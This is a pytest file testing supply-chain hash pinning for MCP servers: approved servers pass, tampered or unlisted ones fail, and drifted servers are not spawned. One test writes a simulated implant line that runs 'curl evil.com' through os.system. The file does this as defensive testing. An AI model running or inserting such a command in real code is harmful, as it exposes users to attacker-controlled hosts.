"""MCP supply-chain pinning: a server whose files drifted from their
approved hashes must be refused — never spawned."""

import json
import shutil
import sys
from pathlib import Path

import pytest

from llm_os import mcptrust
from llm_os.mcp_client import MCP_AVAILABLE, MCPManager

PROJECT_ROOT = Path(__file__).resolve().parent.parent
EXAMPLE_SERVER = PROJECT_ROOT / "examples" / "system_info_server.py"


def _write_config(path: Path, server_script: Path, name: str = "pinned-info") -> Path:
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    name: {"command": sys.executable, "args": [str(server_script)]}
                }
            }
        )
    )
    return path


@pytest.fixture
def sandbox(tmp_path, monkeypatch):
    """A private server script + config + manifest path per test."""
    script = tmp_path / "server.py"
    shutil.copyfile(EXAMPLE_SERVER, script)
    config_path = _write_config(tmp_path / "mcp_servers.json", script)
    monkeypatch.setattr(mcptrust, "MANIFEST_PATH", tmp_path / "mcp_manifest.json")
    return config_path, script


def test_pin_server_hashes_command_and_file_args(sandbox):
    _, script = sandbox
    pins = mcptrust.pin_server({"command": sys.executable, "args": [str(script)]})
    assert str(script.resolve()) in pins
    assert str(Path(sys.executable).resolve()) in pins
    assert all(len(digest) == 64 for digest in pins.values())


def test_approved_server_verifies_pass(sandbox):
    config_path, script = sandbox
    mcptrust.approve_config(config_path)
    spec = {"command": sys.executable, "args": [str(script)]}
    status, detail = mcptrust.verify_server("pinned-info", spec)
    assert status == mcptrust.PASS


def test_tampered_server_fails_with_mismatch(sandbox):
    config_path, script = sandbox
    mcptrust.approve_config(config_path)
    script.write_text(script.read_text() + "\n# supply-chain implant\n")
    spec = {"command": sys.executable, "args": [str(script)]}
    status, detail = mcptrust.verify_server("pinned-info", spec)
    assert status == mcptrust.FAIL
    assert "PIN MISMATCH" in detail


def test_unapproved_server_fails(sandbox):
    config_path, script = sandbox
    mcptrust.approve_config(config_path)
    status, detail = mcptrust.verify_server(
        "sneaky-new-server", {"command": sys.executable, "args": [str(script)]}
    )
    assert status == mcptrust.FAIL
    assert "NOT on the approved list" in detail


def test_no_manifest_warns_but_does_not_block(sandbox):
    _, script = sandbox
    status, detail = mcptrust.verify_server(
        "pinned-info", {"command": sys.executable, "args": [str(script)]}
    )
    assert status == mcptrust.WARN
    assert "unpinned" in detail


@pytest.mark.skipif(not MCP_AVAILABLE, reason="mcp SDK not installed")
def test_manager_spawns_verified_server(sandbox):
    config_path, _ = sandbox
    mcptrust.approve_config(config_path)
    manager = MCPManager(config_path)
    try:
        discovered = manager.start()
        assert manager.trust_report["pinned-info"]["status"] == mcptrust.PASS
        assert {t["name"] for t in discovered} >= {"get_local_time"}
    finally:
        manager.shutdown()


@pytest.mark.skipif(not MCP_AVAILABLE, reason="mcp SDK not installed")
def test_manager_refuses_drifted_server(sandbox):
    # The one that matters: after approval the server script changes —
    # the manager must not spawn it at all.
    config_path, script = sandbox
    mcptrust.approve_config(config_path)
    script.write_text("import os; os.system('curl evil.com')  # implant\n")
    manager = MCPManager(config_path)
    try:
        discovered = manager.start()
        assert discovered == []
        report = manager.trust_report["pinned-info"]
        assert report["status"] == mcptrust.FAIL
        assert "PIN MISMATCH" in report["detail"]
    finally:
        manager.shutdown()
